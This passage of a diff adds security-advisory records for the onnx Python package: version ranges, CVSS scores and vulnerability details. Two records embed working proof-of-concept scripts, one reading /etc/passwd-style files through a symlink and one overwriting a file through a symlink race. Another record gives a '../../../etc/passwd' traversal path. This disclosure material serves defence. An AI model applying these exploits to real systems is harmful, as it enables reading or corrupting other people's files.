+      "details": "## What's the issue\nPassing `silent=True` to `onnx.hub.load()` kills all trust warnings and user prompts. This means a model can be downloaded from any unverified GitHub repo with zero user awareness.\n \n```python\nif not _verify_repo_ref(repo) and not silent:\n    # completely skipped when silent=True\n    print(\"The model repo... is not trusted\")\n    if input().lower() != \"y\":\n        return None\n```\n \nOn top of that, the SHA256 integrity check is useless here \u2014 it validates against a manifest that lives in the same repo the attacker controls, so the hash will always match.\n\n \n## Impact\nAny pipeline using `hub.load()` with `silent=True` and an external repo string is silently loading whatever the repo owner ships. If that model executes arbitrary code on load, the attacker has access to the machine.\n \n## Resolved by removing the feature \n## References\n \n- [Write-up](https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-28500.md)",
+      "published": "2026-03-16T16:23:28Z",
+      "modified": "2026-04-06T23:20:50.829832Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/security/advisories/GHSA-hqmj-h5c6-369m"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-28500"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-28500.md"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/onnx/onnx"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-hqmj-h5c6-369m",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.21.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.19.1",
+        "1.19.1rc1",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.20.0",
+        "1.20.0rc1",
+        "1.20.0rc2",
+        "1.20.1",
+        "1.20.1rc1",
+        "1.21.0rc1",
+        "1.21.0rc2",
+        "1.21.0rc3",
+        "1.21.0rc4",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "affected_conda_versions": [
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.2",
+        "1.3.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.19.1",
+        "1.20.0"
+      ]
+    },
+    {
+      "id": "GHSA-p433-9wv8-28xj",
+      "primary_id": "CVE-2026-34447",
+      "aliases": [
+        "CVE-2026-34447"
+      ],
+      "cve_ids": [
+        "CVE-2026-34447"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "onnx",
+      "summary": "ONNX: External Data Symlink Traversal",
+      "details": "Summary\n- Issue: Symlink traversal in external data loading allows reading files outside the model directory.\n- Affected code: `onnx/onnx/checker.cc: resolve_external_data_location` used via Python `onnx.external_data_helper.load_external_data_for_model`.\n- Impact: Arbitrary file read (confidentiality breach) when a model\u2019s external data path resolves to a symlink targeting a file outside the model directory.\n\nRoot Cause\n- The function `resolve_external_data_location(base_dir, location, tensor_name)` intends to ensure that external data files reside within `base_dir`. It:\n  - Rejects empty/absolute paths\n  - Normalizes the relative path and rejects `..`\n  - Builds `data_path = base_dir / relative_path`\n  - Checks `exists(data_path)` and `is_regular_file(data_path)`\n- However, `std::filesystem::is_regular_file(path)` follows symlinks to their targets. A symlink placed inside `base_dir` that points to a file outside `base_dir` will pass the checks and be returned. The Python loader then opens the path and reads the target file.\n\nCode Reference\n- File: onnx/onnx/checker.cc:970-1060\n- Key logic:\n  - Normalization: `auto relative_path = file_path.lexically_normal().make_preferred();`\n  - Existence: `std::filesystem::exists(data_path)`\n  - Regular file check: `std::filesystem::is_regular_file(data_path)`\n  - Returned path is later opened in Python: `external_data_helper.load_external_data_for_tensor`.\n\nProof of Concept (PoC)\n- File: `onnx_external_data_symlink_traversal_poc.py`\n- Behavior: Creates a model with an external tensor pointing to `tensor.bin`. In the model directory, creates `tensor.bin` as a symlink to `/etc/hosts` (or similar). Calls `load_external_data_for_model(model, base_dir)`. Confirms that `tensor.raw_data` contains content from the target outside the model directory.\n- Run:\n  - `python3 onnx_external_data_symlink_traversal_poc.py`\n  - Expected: `[!!!] VULNERABILITY CONFIRMED: external_data symlink escaped base_dir`\n\nonnx_external_data_symlink_traversal_poc.py\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nONNX External Data Symlink Traversal PoC\n\nFinding: load_external_data_for_model() (via c_checker._resolve_external_data_location)\ndoes not reject symlinks. A relative location that is a symlink inside the\nmodel directory can target a file outside the directory and will be read.\n\nImpact: Arbitrary file read outside model_dir when external data files are\nobtained from attacker-controlled archives (zip/tar) that create symlinks.\n\nThis PoC:\n - Creates a model with a tensor using external_data location 'tensor.bin'\n - Creates 'tensor.bin' as a symlink to a system file (e.g., /etc/hosts)\n - Calls load_external_data_for_model(model, base_dir)\n - Confirms that tensor.raw_data contains the content of the outside file\n\nSafe: only reads a benign system file if present.\n\"\"\"\n\nimport os\nimport sys\nimport tempfile\nimport pathlib\n\n# Ensure we import installed onnx, not the local cloned package\n_here = os.path.dirname(os.path.abspath(__file__))\nif _here in sys.path:\n    sys.path.remove(_here)\n\nimport onnx\nfrom onnx import helper, TensorProto\nfrom onnx.external_data_helper import (\n    set_external_data,\n    load_external_data_for_model,\n)\n\n\ndef pick_target_file():\n    candidates = [\"/etc/hosts\", \"/etc/passwd\", \"/System/Library/CoreServices/SystemVersion.plist\"]\n    for p in candidates:\n        if os.path.exists(p) and os.path.isfile(p):\n            return p\n    raise RuntimeError(\"No suitable readable system file found for this PoC\")\n\n\ndef build_model_with_external(location: str):\n    # A 1D tensor; data will be filled from external file\n    tensor = helper.make_tensor(\n        name=\"X_ext\",\n        data_type=TensorProto.UINT8,\n        dims=[0],  # dims will be inferred after raw_data is read\n        vals=[],\n    )\n    # add dummy raw_data then set_external_data to mark as external\n    tensor.raw_data = b\"dummy\"\n    set_external_data(tensor, location=location)\n\n    # Minimal graph that just feeds the initializer as Constant\n    const_node = helper.make_node(\"Constant\", inputs=[], outputs=[\"out\"], value=tensor)\n    graph = helper.make_graph([const_node], \"g\", inputs=[], outputs=[helper.make_tensor_value_info(\"out\", TensorProto.UINT8, None)])\n    model = helper.make_model(graph)\n    return model\n\n\ndef main():\n    base = tempfile.mkdtemp(prefix=\"onnx_symlink_poc_\")\n    model_dir = base\n    link_name = os.path.join(model_dir, \"tensor.bin\")\n\n    target = pick_target_file()\n    print(f\"[*] Using target file: {target}\")\n\n    # Create symlink in model_dir pointing outside\n    try:\n        pathlib.Path(link_name).symlink_to(target)\n    except OSError as e:\n        print(f\"[!] Failed to create symlink: {e}\")\n        print(\"    This PoC needs symlink capability.\")\n        return 1\n\n    # Build model referencing the relative location 'tensor.bin'\n    model = build_model_with_external(location=\"tensor.bin\")\n\n    # Use in-memory model; explicitly load external data from base_dir\n    loaded = model\n    print(\"[*] Loading external data into in-memory model...\")\n    try:\n        load_external_data_for_model(loaded, base_dir=model_dir)\n    except Exception as e:\n        print(f\"[!] load_external_data_for_model raised: {e}\")\n        return 1\n\n    # Validate that raw_data came from outside file by checking a prefix\n    raw = None\n    # Search initializers\n    for t in loaded.graph.initializer:\n        if t.name == \"X_ext\" and t.HasField(\"raw_data\"):\n            raw = t.raw_data\n            break\n    # Search constant attributes if not found\n    if raw is None:\n        for node in loaded.graph.node:\n            for attr in node.attribute:\n                if attr.HasField(\"t\") and attr.t.name == \"X_ext\" and attr.t.HasField(\"raw_data\"):\n                    raw = attr.t.raw_data\n                    break\n            if raw is not None:\n                break\n    if raw is None:\n        print(\"[?] Did not find raw_data on tensor; PoC inconclusive\")\n        return 2\n\n    with open(target, \"rb\") as f:\n        target_prefix = f.read(32)\n    if raw.startswith(target_prefix):\n        print(\"[!!!] VULNERABILITY CONFIRMED: external_data symlink escaped base_dir\")\n        print(f\"      Symlink {link_name} -> {target}\")\n        return 0\n    else:\n        print(\"[?] Raw data did not match target prefix; environment-specific behavior\")\n        return 3\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n\n```",
+      "published": "2026-04-01T21:14:00Z",
+      "modified": "2026-04-04T00:14:20.688343592Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/security/advisories/GHSA-p433-9wv8-28xj"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34447"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/onnx/onnx"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-p433-9wv8-28xj",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.21.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.19.1",
+        "1.19.1rc1",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.20.0",
+        "1.20.0rc1",
+        "1.20.0rc2",
+        "1.20.1",
+        "1.20.1rc1",
+        "1.21.0rc1",
+        "1.21.0rc2",
+        "1.21.0rc3",
+        "1.21.0rc4",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "affected_conda_versions": [
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.2",
+        "1.3.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.19.1",
+        "1.20.0"
+      ]
+    },
+    {
+      "id": "GHSA-q56x-g2fj-4rj6",
+      "primary_id": "GHSA-q56x-g2fj-4rj6",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "onnx",
+      "summary": "ONNX: TOCTOU arbitrary file read/write in save_external_dat ",
+      "details": "### Summary\n\nThe `save_external_data` method seems to include multiple issues introducing a local TOCTOU vulnerability, an arbitrary file read/write on any system. It potentially includes a path validation bypass on Windows systems.\nRegarding the TOCTOU, an attacker seems to be able to overwrite victim's files via symlink following under the same privilege scope.\nThe mentioned function can be found here: https://github.com/onnx/onnx/blob/main/onnx/external_data_helper.py#L188\n\n### Details\n\n#### TOCTOU\nThe vulnerable code pattern:\n```python\n   # CHECK - Is this a file?\n   if not os.path.isfile(external_data_file_path):\n       # Line 228-229: USE #1 - Create if it doesn't exist\n       with open(external_data_file_path, \"ab\"):\n           pass\n   \n   # Open for writing\n   with open(external_data_file_path, \"r+b\") as data_file:\n       # Lines 233-243: Write tensor data\n       data_file.seek(0, 2)\n       if info.offset is not None:\n           file_size = data_file.tell()\n           if info.offset > file_size:\n               data_file.write(b\"\\0\" * (info.offset - file_size))\n           data_file.seek(info.offset)\n       offset = data_file.tell()\n       data_file.write(tensor.raw_data)\n```\nThere is a time gap between `os.path.isfile` and `open` with no atomic file creation flags (e.g. `O_EXCEL | O_CREAT`) allowing the attacker to create a symlink that is being followed (absence of `O_NOFOLLOW`), between these two calls. By combining these, the attack is possible as shown below in the PoC section.\n\n#### Bypass\nThere is also a potential validation bypass on Windows systems in the same method (https://github.com/onnx/onnx/blob/main/onnx/external_data_helper.py#L203) alloing absolute paths like `C:\\` (only 1 part):\n```python\nif location_path.is_absolute() and len(location_path.parts) > 1\n```\nThis may allow Windows Path Traversals (not 100% verified as I am emulating things on a Debian distro).\n\n### PoC\n\nInstall the dependencies and run this:\n```python\nmport os\nimport sys\nimport tempfile\nimport numpy as np\nimport onnx\nfrom onnx import TensorProto, helper\nfrom onnx.numpy_helper import from_array\n\n# Create a temporary directory for our poc\nwith tempfile.TemporaryDirectory() as tmpdir:\n    print(f\"[*] Working directory: {tmpdir}\")\n\n    # Create a \"sensitive\" file that we'll overwrite\n    sensitive_file = os.path.join(tmpdir, \"sensitive.txt\")\n    with open(sensitive_file, 'w') as f:\n        f.write(\"SENSITIVE DATA - DO NOT OVERWRITE\")\n\n    original_content = open(sensitive_file, 'rb').read()\n    print(f\"[*] Created sensitive file: {sensitive_file}\")\n    print(f\"    Original content: {original_content}\")\n\n    # Create a simple ONNX model with a large tensor\n    print(\"[*] Creating ONNX model with external data...\")\n\n    # Create a tensor with data > 1KB (to trigger external data)\n    large_array = np.ones((100, 100), dtype=np.float32)  # 40KB tensor\n    large_tensor = from_array(large_array, name='large_weight')\n\n    # Create a minimal model\n    model = helper.make_model(\n        helper.make_graph(\n            [helper.make_node('Identity', ['input'], ['output'])],\n            'minimal_model',\n            [helper.make_tensor_value_info('input', TensorProto.FLOAT, [100, 100])],\n            [helper.make_tensor_value_info('output', TensorProto.FLOAT, [100, 100])],\n            [large_tensor]\n        )\n    )\n\n    # Save model with external data to create the external data file\n    model_path = os.path.join(tmpdir, \"model.onnx\")\n    external_data_name = \"data.bin\"\n    external_data_path = os.path.join(tmpdir, external_data_name)\n\n    onnx.save_model(\n        model, \n        model_path,\n        save_as_external_data=True,\n        all_tensors_to_one_file=True,\n        location=external_data_name,\n        size_threshold=1024\n    )\n\n    print(f\"[+] Model saved: {model_path}\")\n    print(f\"[+] External data created: {external_data_path}\")\n\n    # Now comes the attack: replace the external data file with a symlink\n    print(\"[!] ATTACK: Replacing external data file with symlink...\")\n\n    # Remove the legitimate external data file\n    if os.path.exists(external_data_path):\n        os.remove(external_data_path)\n        print(f\"    Removed: {external_data_path}\")\n\n    # Create symlink pointing to sensitive file\n    os.symlink(sensitive_file, external_data_path)\n    print(f\"    Created symlink: {external_data_path} -> {sensitive_file}\")\n\n    # Now load and re-save the model, which will trigger the vulnerability\n    print(\"Loading model and saving with external data...\")\n    try:\n        # Load the model (without loading external data)\n        loaded_model = onnx.load(model_path, load_external_data=False)\n\n        # Modify the model slightly (to ensure we write new data)\n        loaded_model.graph.initializer[0].raw_data = large_array.tobytes()\n\n        # Save again - this will call save_external_data() and follow the symlink\n        onnx.save_model(\n            loaded_model,\n            model_path,\n            save_as_external_data=True,\n            all_tensors_to_one_file=True,\n            location=external_data_name,\n            size_threshold=1024\n        )\n    except Exception as e:\n        print(f\"[-] Error: {e}\")\n    \n    # Check if the sensitive file was overwritten\n    print(\"[*] Checking if sensitive file was modified...\")\n    modified_content = open(sensitive_file, 'rb').read()\n    \n    print(f\"    Original size: {len(original_content)} bytes\")\n    print(f\"    Current size:  {len(modified_content)} bytes\")\n    print(f\"    Original content: {original_content[:50]}\")\n    print(f\"    Current content:  {modified_content[:50]}...\")\n    print()\n    \n    if modified_content != original_content:\n        print(\"[!] Success!\")\n    else:\n        print(\"[-] Failure\")\n```\nOutput:\n```\n[*] Working directory: /tmp/tmpqy7z88_l\n[*] Created sensitive file: /tmp/tmpqy7z88_l/sensitive.txt\n    Original content: b'SENSITIVE DATA - DO NOT OVERWRITE'\n\n[*] Creating ONNX model with external data...\n[+] Model saved: /tmp/tmpqy7z88_l/model.onnx\n[+] External data created: /tmp/tmpqy7z88_l/data.bin\n[!] ATTACK: Replacing external data file with symlink...\n    Removed: /tmp/tmpqy7z88_l/data.bin\n    Created symlink: /tmp/tmpqy7z88_l/data.bin -> /tmp/tmpqy7z88_l/sensitive.txt\nLoading model and saving with external data...\n[*] Checking if sensitive file was modified...\n    Original size: 33 bytes\n    Current size:  40033 bytes\n    Original content: b'SENSITIVE DATA - DO NOT OVERWRITE'\n    Current content:  b'SENSITIVE DATA - DO NOT OVERWRITE\\x00\\x00\\x80?\\x00\\x00\\x80?\\x00\\x00\\x80?\\x00\\x00\\x80?\\x00'...\n```\nSuccessfully overwritting the \"sensitive data\" file.\n\n### Impact\nThe impact may include filesystem injections (e.g. on ssh keys, shell configs, crons) or destruction of files, affecting integrity and availability.\n\n### Mitigations\n1. Atomic file creation\n2. Symlink protection\n3. Path canonicalization",
+      "published": "2026-04-01T23:40:58Z",
+      "modified": "2026-04-04T00:14:21.103127495Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/security/advisories/GHSA-q56x-g2fj-4rj6"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/onnx/onnx"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-q56x-g2fj-4rj6",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.21.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.19.1",
+        "1.19.1rc1",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.20.0",
+        "1.20.0rc1",
+        "1.20.0rc2",
+        "1.20.1",
+        "1.20.1rc1",
+        "1.21.0rc1",
+        "1.21.0rc2",
+        "1.21.0rc3",
+        "1.21.0rc4",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "affected_conda_versions": [
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.2",
+        "1.3.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.19.1",
+        "1.20.0"
+      ]
+    },
+    {
+      "id": "GHSA-whh8-fjgc-qp73",
+      "primary_id": "CVE-2024-27318",
+      "aliases": [
+        "CVE-2024-27318",
+        "PYSEC-2024-222"
+      ],
+      "cve_ids": [
+        "CVE-2024-27318"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "onnx",
+      "summary": "Onnx Directory Traversal vulnerability",
+      "details": "Versions of the package onnx before and including 1.15.0 are vulnerable to Directory Traversal as the external_data field of the tensor proto can have a path to the file which is outside the model current directory or user-provided directory. The vulnerability occurs as a bypass for the patch added for CVE-2022-25882.",
+      "published": "2024-02-23T18:30:59Z",
+      "modified": "2026-02-04T03:42:18.553584Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-27318"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/commit/66b7fb630903fdcf3e83b6b6d56d82e904264a20"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/onnx/onnx"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/onnx/PYSEC-2024-222.yaml"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FGTBH5ZYL2LGYHIJDHN2MAUURIR5E7PY"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TFJJID2IZDOLFDMWVYTBDI75ZJQC6JOL"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-PYTHON-ONNX-2395479"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-whh8-fjgc-qp73",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.16.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "affected_conda_versions": [
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.2",
+        "1.3.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0"
+      ]
+    },
+    {
+      "id": "PYSEC-2023-38",
+      "primary_id": "CVE-2022-25882",
+      "aliases": [
+        "CVE-2022-25882",
+        "GHSA-ffxj-547x-5j7c"
+      ],
+      "cve_ids": [
+        "CVE-2022-25882"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "onnx",
+      "summary": null,
+      "details": "Versions of the package onnx before 1.13.0 are vulnerable to Directory Traversal as the external_data field of the tensor proto can have a path to the file which is outside the model current directory or user-provided directory, for example \"../../../etc/passwd\"",
+      "published": "2023-01-26T21:15:00Z",
+      "modified": "2023-11-08T04:08:50.586068Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://gist.github.com/jnovikov/02a9aff9bf2188033e77bd91ff062856"
+        },
+        {
+          "type": "REPORT",
+          "url": "https://github.com/onnx/onnx/issues/3991"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-PYTHON-ONNX-2395479"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/blob/96516aecd4c110b0ac57eba08ac236ebf7205728/onnx/checker.cc%23L129"
+        },
+        {
+          "type": "FIX",
+          "url": "https://github.com/onnx/onnx/commit/f369b0e859024095d721f1d1612da5a8fa38988d"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/onnx/onnx/pull/4400"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2023-38",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.13.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "affected_conda_versions": [
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.2",
+        "1.3.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0"
+      ]
+    },
+    {
+      "id": "PYSEC-2024-222",
+      "primary_id": "CVE-2024-27318",
+      "aliases": [
+        "CVE-2024-27318",
+        "GHSA-whh8-fjgc-qp73"
+      ],
+      "cve_ids": [
+        "CVE-2024-27318"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "onnx",
+      "summary": null,
+      "details": "Versions of the package onnx before and including 1.15.0 are vulnerable to Directory Traversal as the external_data field of the tensor proto can have a path to the file which is outside the model current directory or user-provided directory. The vulnerability occurs as a bypass for the patch added for CVE-2022-25882.\n",
+      "published": "2024-02-23T18:15:50Z",
+      "modified": "2025-01-22T16:56:46.917347Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "FIX",
+          "url": "https://github.com/onnx/onnx/commit/66b7fb630903fdcf3e83b6b6d56d82e904264a20"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FGTBH5ZYL2LGYHIJDHN2MAUURIR5E7PY/"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TFJJID2IZDOLFDMWVYTBDI75ZJQC6JOL/"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-PYTHON-ONNX-2395479"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2024-222",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.16.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "affected_conda_versions": [
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.2",
+        "1.3.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0"
+      ]
+    },
+    {
+      "id": "PYSEC-2024-223",
